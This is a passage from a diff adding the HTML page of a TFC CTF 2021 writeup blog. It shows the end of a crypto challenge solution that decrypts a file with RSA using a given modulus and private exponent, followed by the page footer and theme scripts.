+<span class="n">c</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;chall.enc&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">c</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+
+<span class="n">n</span> <span class="o">=</span> <span class="mi">17729028558979019485846420034614601781855286885772116033115998289130663218793249135103097941406615594783564487056148202535602218241261076180277862184340050681277512936764254998557657989633659561175844653871375735119626199870178796372816549333367076487655787617921785826120525919291798195591267544750350222858119219959311035913906885739352404726672836723117136379411134589884489391116922923390687958161705756705708668649262568471831705504852664779788943978721769038284989250803324876493071615384204553854811020877754034576798208169454695001947778015807032019651748938505463608871771494765303144219873993106068807291321</span>
+
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+
+<span class="n">d</span> <span class="o">=</span> <span class="mi">3500250248327349941672136790330322298173940781772211260089535710561387481696840724462501857940708289682233561164220235784490548878094466708830359320737536288891004163888989356033042963942046798938832323366063912548832619743354798758989171488234685790832327326369684099122228433857463369589017055427083655546629869448560863558252541573729181294198925126252806108158471450212498376272391643662951937867203907881541852521739527440641096867158947718038717211827677824862115138300242300421747601306316869658769565879739394458142873158790249493313154357342610957929927393333582078957693189916431285660748179207993771566093</span>
+
+<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flagrsa.png"
+        data-srcset="/tfcctf2021-writeup/datas/flagrsa.png, datas/flagrsa.png 1.5x, /tfcctf2021-writeup/datas/flagrsa.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/flagrsa.png"
+        title="Res" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-23</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/tfcctf2021-writeup/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" data-title="TFC CTF 2021 Writeup" data-via="w31rdr4v3n" data-hashtags="ctf,crypto,misc,pwn"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://w31rdr4v3n.github.io/tfcctf2021-writeup/"><i class="fab fa-linkedin fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" data-title="TFC CTF 2021 Writeup" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" data-title="TFC CTF 2021 Writeup"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" data-title="TFC CTF 2021 Writeup"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" data-title="TFC CTF 2021 Writeup" data-image="tfc.png"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/crypto/">crypto</a>,&nbsp;<a href="/tags/misc/">misc</a>,&nbsp;<a href="/tags/pwn/">pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/picoctf2022-writeup/" class="next" rel="next" title="picoCTF2022 Writeup">picoCTF2022 Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">R4v3N Sadoc</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
